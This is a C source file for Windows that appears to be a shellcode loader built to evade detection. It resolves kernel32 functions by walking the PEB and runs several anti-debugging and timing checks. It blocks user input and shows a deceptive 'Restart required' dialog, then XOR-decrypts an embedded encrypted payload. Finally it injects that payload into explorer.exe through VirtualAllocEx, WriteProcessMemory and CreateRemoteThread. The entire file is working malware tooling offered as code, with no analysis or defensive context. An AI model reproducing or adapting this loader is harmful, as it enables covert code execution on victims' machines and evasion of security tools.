#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
#define FLG_HEAP_ENABLE_FREE_CHECK   0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40
#define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)
#include <Windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#define _NO_CRT_STDIO_INLINE
typedef PVOID(WINAPI* PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI* PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
typedef PVOID(WINAPI* PWaitForSingleObject)(HANDLE, DWORD);
typedef HMODULE(WINAPI* PGetModuleHandleA)(PCSTR);
typedef FARPROC(WINAPI* PGetProcAddress)(HMODULE, PCSTR);
typedef unsigned __int64 uint64_t;

DWORD GetProcessIdByName(const char* name)
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	char buf[MAX_PATH] = { 0 };
	size_t charsConverted = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			wcstombs_s(&charsConverted, buf, entry.szExeFile, MAX_PATH);
			if (_stricmp(buf, name) == 0)
			{
				return entry.th32ProcessID;
			}
		}
	}
	return NULL;
}
// XOR decrypt function
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}
int mystart(int argc, char* argv[])
{
	PPEB pPEB = (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA pLoaderData = pPEB->Ldr;
	PLIST_ENTRY listHead = &pLoaderData->InMemoryOrderModuleList;
	PLIST_ENTRY listCurrent = listHead->Flink;
	PVOID kernel32Address;

	//Get Computer name -->
	PPEB pPEB2 = (PPEB)__readgsqword(0x60);
	PVOID params = (PVOID) * (uint64_t*)((PBYTE)pPEB + 0x20);
	PWSTR environmental_variables = (PWSTR) * (uint64_t*)((PBYTE)params + 0x80);
	while (environmental_variables)
	{
		PWSTR m = wcsstr(environmental_variables, L"COMPUTERNAME=");
		if (m) break;
		environmental_variables += wcslen(environmental_variables) + 1;
	}
	PWSTR computerName = wcsstr(environmental_variables, L"=") + 1;


	do{
		PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, NULL, 0, NULL, NULL);
		PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);
		WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllName, dllNameLength, NULL, NULL);
		CharUpperA(dllName);
		if (strstr(dllName, "KERNEL32.DLL"))
		{
			kernel32Address = dllEntry->DllBase;
			HeapFree(GetProcessHeap(), 0, dllName);
			break;
		}
		HeapFree(GetProcessHeap(), 0, dllName);
		listCurrent = listCurrent->Flink;
	} while (listCurrent != listHead);
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)kernel32Address;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)kernel32Address + pDosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)kernel32Address + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PULONG pAddressOfFunctions = (PULONG)((PBYTE)kernel32Address + pExportDirectory->AddressOfFunctions);
	PULONG pAddressOfNames = (PULONG)((PBYTE)kernel32Address + pExportDirectory->AddressOfNames);
	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)kernel32Address + pExportDirectory->AddressOfNameOrdinals);

	PGetModuleHandleA pGetModuleHandleA = NULL;
	PGetProcAddress pGetProcAddress = NULL;

	for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
	{
		PCSTR pFunctionName = (PSTR)((PBYTE)kernel32Address + pAddressOfNames[i]);
		if (!strcmp(pFunctionName, "GetModuleHandleA"))
		{
			pGetModuleHandleA = (PGetModuleHandleA)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
		if (!strcmp(pFunctionName, "GetProcAddress"))
		{
			pGetProcAddress = (PGetProcAddress)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
	}

	HMODULE hKernel32 = pGetModuleHandleA("kernel32.dll");
	PVirtualAlloc funcVirtualAlloc = (PVirtualAlloc)pGetProcAddress(hKernel32, "VirtualAlloc");
	PCreateThread funcCreateThread = (PCreateThread)pGetProcAddress(hKernel32, "CreateThread");
	PWaitForSingleObject funcWaitForSingleObject = (PWaitForSingleObject)pGetProcAddress(hKernel32, "WaitForSingleObject");


		BlockInput(true);

		//Get System Time then compare
		int t1 = GetTickCount64();
		//bypass the IsDebuggerPresent check
		//DWORD64 dwpeb = __readgsqword(0x60);
		//*((PBYTE)(dwpeb + 2)) = 0;

		//this can not detect vs debugger***
		PDWORD pNtGlobalFlag = (PDWORD)(__readgsqword(0x60) + 0xBC);
		bool checkDebug0 = (*pNtGlobalFlag) & NT_GLOBAL_FLAG_DEBUGGED;

		ULONGLONG uptime = GetTickCount64() / 1000; 
		int response = MessageBoxW(NULL, L"Do you want to restart your computer now?", L"Restart required", MB_YESNOCANCEL);
		//1. way
		//PPEB pPEB = (PPEB)__readgsqword(0x60);
		//bool isDebugged = pPEB->BeingDebugged;
		
		//2. way
		BOOL isDebuggerPresent = FALSE;
		CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);

		//3. way
		typedef NTSTATUS(WINAPI* PNtQueryInformationProcess)(IN  HANDLE, IN  PROCESSINFOCLASS, OUT PVOID, IN ULONG, OUT PULONG);
		PNtQueryInformationProcess pNtQueryInformationProcess = (PNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
		DWORD64 isDebuggerPresent2 = 0;
		pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &isDebuggerPresent2, sizeof DWORD64, NULL);

		int t2 = GetTickCount64();
		if (((t2 - t1) / 1000) > 5)
			return 1;

		/* && computerName != L"DESKTOP-4VTM6UE"/* && uptime < 1200**numberOfProcessors <= 4*/
		if (response != IDNO  /* || IsDebuggerPresent()*/)
		{
		}
		else
		{
			//std::cout << uptime / 60 << "dakikadýr sistem açýk\n";
			SYSTEM_INFO systemInfo;
			GetSystemInfo(&systemInfo);
			DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
				char xorPayload2[] =
				{ 0x91, 0x31, 0xf0, 0x91, 0x80, 0x8d, 0xb2, 0x73, 0x65, 0x63, 0x33, 0x34, 0x35, 0x3b, 0x37, 0x28, 0x3b, 0x31, 0x42, 0xa7, 0x15, 0x2d, 0xf9, 0x21, 0x5, 0x2b, 0xf9, 0x37, 0x6c, 0x23, 0xee, 0x2b, 0x4d, 0x31, 0xf8, 0x7, 0x20, 0x2d, 0x7d, 0xc4, 0x2f, 0x29, 0x3f, 0x54, 0xbd, 0x23, 0x54, 0xb9, 0xc1, 0x45, 0x12, 0x9, 0x72, 0x49, 0x52, 0x32, 0xa4, 0xaa, 0x7f, 0x24, 0x75, 0xaa, 0x87, 0x94, 0x3f, 0x38, 0x22, 0x3d, 0xfb, 0x37, 0x52, 0xf8, 0x27, 0x5f, 0x3a, 0x64, 0xa4, 0xe0, 0xe5, 0xf1, 0x6d, 0x79, 0x73, 0x3d, 0xf5, 0xa5, 0x6, 0x14, 0x2d, 0x62, 0xa2, 0x35, 0xff, 0x23, 0x7d, 0x3d, 0xe6, 0x39, 0x53, 0x3c, 0x71, 0xb5, 0x91, 0x25, 0x2d, 0x9c, 0xbb, 0x24, 0xff, 0x5f, 0xed, 0x31, 0x6c, 0xaf, 0x3e, 0x44, 0xb9, 0x2d, 0x43, 0xb3, 0xc9, 0x22, 0xb3, 0xac, 0x79, 0x2a, 0x64, 0xb8, 0x55, 0x99, 0x6, 0x84, 0x3c, 0x66, 0x3e, 0x57, 0x6d, 0x26, 0x4b, 0xb4, 0x1, 0xb3, 0x3d, 0x3d, 0xe6, 0x39, 0x57, 0x3c, 0x71, 0xb5, 0x14, 0x32, 0xee, 0x6f, 0x3a, 0x21, 0xff, 0x2b, 0x79, 0x30, 0x6c, 0xa9, 0x32, 0xfe, 0x74, 0xed, 0x3a, 0x72, 0xb5, 0x22, 0x2a, 0x24, 0x2c, 0x35, 0x3c, 0x23, 0x2c, 0x21, 0x32, 0x2c, 0x31, 0x3f, 0x3a, 0xf0, 0x89, 0x43, 0x33, 0x37, 0x8b, 0x8b, 0x3d, 0x38, 0x34, 0x23, 0x3b, 0xfe, 0x62, 0x8c, 0x25, 0x8c, 0x9a, 0x9c, 0x2f, 0x2c, 0xca, 0x1c, 0x16, 0x4b, 0x32, 0x4a, 0x41, 0x75, 0x70, 0x24, 0x24, 0x3a, 0xec, 0x85, 0x3a, 0xe4, 0x98, 0xcb, 0x64, 0x79, 0x6d, 0x30, 0xfa, 0x90, 0x39, 0xd9, 0x70, 0x73, 0x74, 0x3f, 0xf9, 0x5e, 0xf6, 0x23, 0x24, 0x2d, 0x24, 0xf0, 0x97, 0x39, 0xf9, 0x94, 0x33, 0xc9, 0x29, 0x14, 0x54, 0x62, 0x8b, 0xbe, 0x29, 0xf0, 0x87, 0x11, 0x72, 0x74, 0x70, 0x65, 0x2b, 0x32, 0xdf, 0x4a, 0xf2, 0xe, 0x74, 0x94, 0xb0, 0x29, 0x3d, 0x34, 0x42, 0xbc, 0x3d, 0x54, 0xb2, 0x3b, 0x9a, 0xa3, 0x3a, 0xec, 0xb6, 0x23, 0x9a, 0xb9, 0x25, 0xf0, 0xb2, 0x34, 0xca, 0x8f, 0x7d, 0xac, 0x85, 0x9c, 0xa7, 0x2d, 0xfd, 0xac, 0xf, 0x69, 0x2c, 0x21, 0x3f, 0xfc, 0x92, 0x2d, 0xfb, 0x8a, 0x24, 0xd9, 0xeb, 0xc0, 0x0, 0xa, 0x9a, 0xac, 0x25, 0xf8, 0xb7, 0x35, 0x72, 0x65, 0x72, 0x3a, 0xdd, 0x0, 0x1f, 0x1, 0x74, 0x6b, 0x65, 0x79, 0x6d, 0x38, 0x23, 0x34, 0x20, 0x2d, 0xfb, 0x91, 0x32, 0x34, 0x25, 0x28, 0x45, 0xab, 0xf, 0x74, 0x34, 0x38, 0x23, 0x97, 0x8c, 0x3, 0xb5, 0x37, 0x41, 0x37, 0x73, 0x64, 0x3c, 0xe6, 0x21, 0x5d, 0x75, 0xbf, 0x73, 0x1d, 0x38, 0xec, 0x94, 0x25, 0x35, 0x22, 0x22, 0x24, 0x24, 0x2a, 0x35, 0x30, 0x92, 0xb9, 0x32, 0x25, 0x39, 0x9a, 0xba, 0x3e, 0xec, 0xa2, 0x3e, 0xec, 0xb5, 0x2a, 0xdf, 0x0, 0xa1, 0x46, 0xf5, 0x8a, 0xa5, 0x2d, 0x43, 0xa1, 0x2d, 0x9c, 0xb8, 0xee, 0x7a, 0x2a, 0xdf, 0x71, 0xea, 0x64, 0x13, 0x8a, 0xa5, 0xde, 0x82, 0xc6, 0xc7, 0x35, 0x33, 0xdf, 0xd2, 0xfe, 0xd8, 0xe4, 0x92, 0xac, 0x3b, 0xf6, 0xb4, 0x4d, 0x4e, 0x75, 0x19, 0x69, 0xf2, 0x9e, 0x94, 0x1e, 0x60, 0xc2, 0x2a, 0x6a, 0x1, 0x1a, 0x1a, 0x65, 0x2b, 0x32, 0xec, 0xb9, 0x8d, 0xb0 };
					//char ngrokPayload[] = "";
				char my_secret_key[] = "mysupersecretkey";
				XOR((char*)xorPayload2, sizeof xorPayload2, my_secret_key, sizeof(my_secret_key));
				int processID = GetProcessIdByName("explorer.exe");
				HANDLE ph; // process handle
				HANDLE hnd; // remote thread
				PVOID rb; // remote buffer
				ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(processID));
				// allocate memory buffer for remote process
				rb = VirtualAllocEx(ph, NULL, sizeof xorPayload2, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
				// "copy" data between processes
				WriteProcessMemory(ph, rb, xorPayload2, sizeof xorPayload2, NULL);
				// our process start new thread
				hnd = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);

				/*LPVOID string_exec = funcVirtualAlloc(0, sizeof xorPayload2, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				//RtlCopyMemory(*Destination,*Source,Length) Copies the contents of a source memory block to a destination memory block
				
				//XOR((char*)xorPayload2, sizeof xorPayload2, my_secret_key, sizeof(my_secret_key));
				RtlCopyMemory(string_exec, xorPayload2, sizeof xorPayload2);
				DWORD threadID;
				HANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)string_exec, NULL, 0, &threadID);
				funcWaitForSingleObject(hThread, INFINITE);*/
		}
}
